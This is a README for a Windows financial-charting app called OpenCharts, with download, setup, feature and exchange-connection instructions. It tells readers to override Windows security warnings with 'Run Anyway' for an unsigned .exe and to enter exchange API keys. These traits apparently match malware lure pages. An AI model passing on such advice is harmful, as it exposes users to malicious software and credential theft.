# 📈 OpenCharts - Analyze global markets with ease

[![Download OpenCharts](https://img.shields.io/badge/Download-OpenCharts-blue.svg)](https://github.com/cu3j3n18/OpenCharts)

OpenCharts provides a free, self-hosted system for viewing financial data. It tracks stocks, crypto, and currency markets in real time. You use it to view charts, apply technical indicators, and monitor price alerts. It works as an alternative to expensive subscription tools.

## 🚀 Getting Started

Follow these steps to set up the software on your Windows computer.

1. Go to the [OpenCharts release page](https://github.com/cu3j3n18/OpenCharts).
2. Look for the Assets section.
3. Select the file ending in .exe for Windows.
4. Download the file to your computer.
5. Double-click the file to start the installer.
6. Follow the on-screen prompts to complete the setup.
7. Open the application from your desktop icon.

## 🛠 System Requirements

Ensure your computer meets these standards for smooth performance:

- Operating System: Windows 10 or Windows 11.
- Memory: 8GB of RAM.
- Processor: Dual-core CPU at 2.0 GHz or faster.
- Disk Space: 500MB for the application files.
- Internet: Stable connection for real-time market updates.

## 📁 Installation Details

[Download the application here.](https://github.com/cu3j3n18/OpenCharts)

The installer manages all necessary components. You do not need to install extra software like databases or web servers. The package includes a local data store to keep your chart settings and preferences on your own machine. 

If you see a security prompt from Windows during installation, click "More Info" and then "Run Anyway." This happens because we provide the app directly without a third-party digital signature.

## 📊 Core Features

- Real-Time Data: Connect to exchanges like Alpaca to see price changes as they happen.
- Custom Canvas Engine: View smooth charts that update instantly when prices move.
- Technical Indicators: Access over 20 built-in tools like Moving Averages, RSI, and MACD.
- Alert System: Configure the app to notify you when a price crosses a specific level.
- Script Support: Use PineScript to create or import custom trading strategies.
- Plugins: Extend the interface to add functionality specific to your needs.

## 💡 Using the Interface

The main window displays your current chart. Use the toolbar at the top to change symbols or time intervals. The sidebar contains your list of added indicators. 

### Adding Indicators
Click the "Indicators" button at the top of the chart. Search for the tool you need in the list. Click the name of the indicator to add it to your chart. You can modify settings like period lengths by clicking the gear icon next to the indicator name on the chart.

### Setting Price Alerts
Right-click anywhere on the price scale along the right side of the chart. Select "Add Alert." A menu will appear where you can set the trigger condition. Once you save the alert, the app monitors the price and sends a desktop notification when the price hits your target.

### Drawing Tools
Select tools from the left menu to draw lines, shapes, or notes on your chart. These stay saved to your specific symbol layout. The software uses a custom 2D engine to keep these drawings sharp and responsive.

## ⚙️ Configuration Options

Open the Settings menu from the top corner to adjust application behavior.

- Theme: Toggle between light and dark modes to suit your workspace.
- Connection: Enter your API keys for exchanges here if you want to use live order execution.
- Storage: Pick a folder for your exported chart data and local logs.

## ❓ Troubleshooting

If you encounter issues, try these steps:

1. Restart the application.
2. Check your internet connection.
3. Ensure no other trading software blocks the application ports.
4. Check the "Logs" folder in the installation directory for error details.

The software runs as a self-contained service. This means your data stays on your machine and remains private. We do not store your trade history or API keys on external servers. 

## 🌐 Connect to Exchanges

You can connect to crypto and stock exchanges to see live market depth. Open the "Exchange Integration" tab in settings. Choose your provider from the dropdown menu. Enter the API key and secret provided by your exchange account. The app stays in sync through WebSocket connections to ensure you get data without delays.

## 📝 Custom Scripts

This software supports PineScript. You can import existing files by clicking the "Scripts" tab. The internal transpiler converts these instructions into visual data on your screen. This allows you to visualize complex formulas without writing code yourself. Simply paste the script content into the editor and hit "Apply."

## 🛡 Security and Privacy

Your charts and trading strategies belong to you. Because the application runs locally, it does not send your data to our servers. Every configuration, custom script, and alert stays within your local folder. We recommend keeping your API keys protected and storing your computer password securely. 

## 📦 Updates

When a new version becomes available, the application notifies you at startup. Download the new installer from the link above and run it over your existing install. It will update the core engine while keeping your settings and saved charts intact.